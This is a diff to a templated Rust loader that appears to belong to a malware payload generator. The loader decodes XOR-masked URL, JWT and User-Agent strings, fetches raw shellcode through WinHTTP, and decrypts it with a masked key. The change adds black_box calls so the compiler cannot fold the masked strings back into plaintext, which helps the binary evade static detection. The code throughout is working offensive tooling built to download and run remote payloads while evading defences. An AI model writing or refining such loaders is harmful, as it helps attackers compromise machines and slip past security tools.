@@ -33,18 +33,23 @@ fn {{ v.fn_run }}() {
         // Staged fetch: URL/JWT/User-Agent are XOR-masked per-build, decoded just before
         // the fetch. Network call uses WinHTTP (no Rust HTTP-client signatures in the
         // binary). Response body is the *raw* shellcode (transport encryption via HTTPS).
+        // `black_box` defeats rustc's constant-folding of the XOR loop — without it the
+        // optimizer would pre-compute the plaintext URL into rodata.
         let mut {{ sg.sg_lv_url }}: [u8; {{ staged_url_len }}] = [
             {%- for b in staged_url_enc %}{{ b }},{% endfor %}
         ];
-        for {{ sg.sg_lv_i }} in &mut {{ sg.sg_lv_url }} { *{{ sg.sg_lv_i }} ^= {{ staged_url_xk }} as u8; }
+        let {{ sg.sg_lv_url }}_k = core::hint::black_box({{ staged_url_xk }}_u8);
+        for {{ sg.sg_lv_i }} in &mut {{ sg.sg_lv_url }} { *{{ sg.sg_lv_i }} ^= {{ sg.sg_lv_url }}_k; }
         let mut {{ sg.sg_lv_jwt }}: [u8; {{ staged_jwt_len }}] = [
             {%- for b in staged_jwt_enc %}{{ b }},{% endfor %}
         ];
-        for {{ sg.sg_lv_i }} in &mut {{ sg.sg_lv_jwt }} { *{{ sg.sg_lv_i }} ^= {{ staged_jwt_xk }} as u8; }
+        let {{ sg.sg_lv_jwt }}_k = core::hint::black_box({{ staged_jwt_xk }}_u8);
+        for {{ sg.sg_lv_i }} in &mut {{ sg.sg_lv_jwt }} { *{{ sg.sg_lv_i }} ^= {{ sg.sg_lv_jwt }}_k; }
         let mut {{ sg.sg_lv_ua }}: [u8; {{ staged_ua_len }}] = [
             {%- for b in staged_ua_enc %}{{ b }},{% endfor %}
         ];
-        for {{ sg.sg_lv_i }} in &mut {{ sg.sg_lv_ua }} { *{{ sg.sg_lv_i }} ^= {{ staged_ua_xk }} as u8; }
+        let {{ sg.sg_lv_ua }}_k = core::hint::black_box({{ staged_ua_xk }}_u8);
+        for {{ sg.sg_lv_i }} in &mut {{ sg.sg_lv_ua }} { *{{ sg.sg_lv_i }} ^= {{ sg.sg_lv_ua }}_k; }
         let {{ v.var_ptr }} = match scaffold::stager::fetch(
             core::str::from_utf8(&{{ sg.sg_lv_url }}).unwrap_or(""),
             core::str::from_utf8(&{{ sg.sg_lv_jwt }}).unwrap_or(""),
@@ -60,7 +65,9 @@ fn {{ v.fn_run }}() {
         let mut {{ v.var_key }}: [u8; 32] = [
             {%- for byte in masked_key_bytes %}{{ byte }},{% endfor %}
         ];
-        for {{ v.bin_lv_ki }} in &mut {{ v.var_key }} { *{{ v.bin_lv_ki }} ^= {{ key_tweak }} as u8; }
+        // black_box prevents rustc from constant-folding the XOR back to plaintext
+        let {{ v.var_key }}_t = core::hint::black_box({{ key_tweak }}_u8);
+        for {{ v.bin_lv_ki }} in &mut {{ v.var_key }} { *{{ v.bin_lv_ki }} ^= {{ v.var_key }}_t; }
         let {{ v.var_iv }}: [u8; 16] = [
             {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
         ];
